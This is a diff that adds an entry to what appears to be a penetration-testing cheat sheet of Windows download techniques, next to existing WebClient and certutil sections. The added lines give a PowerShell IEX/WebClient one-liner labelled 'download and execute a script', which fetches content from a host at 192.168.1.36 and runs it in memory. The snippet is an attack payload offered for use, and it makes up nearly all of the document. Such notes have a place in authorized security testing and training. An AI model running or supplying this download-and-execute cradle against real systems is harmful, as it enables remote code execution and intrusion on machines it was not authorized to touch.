@@ -14,6 +14,13 @@ powershell (new-object System.Net.WebClient).Downloadfile('http://192.168.1.36/n
 ```
 
 
+`download and execute a script`
+
+```pwsh
+powershell IEX(New-Object Net.WebClient).downloadString(\"http://192.168.1.36/ncat.exe\")
+```
+
+
 ## certutil.exe
 
 ```powershell
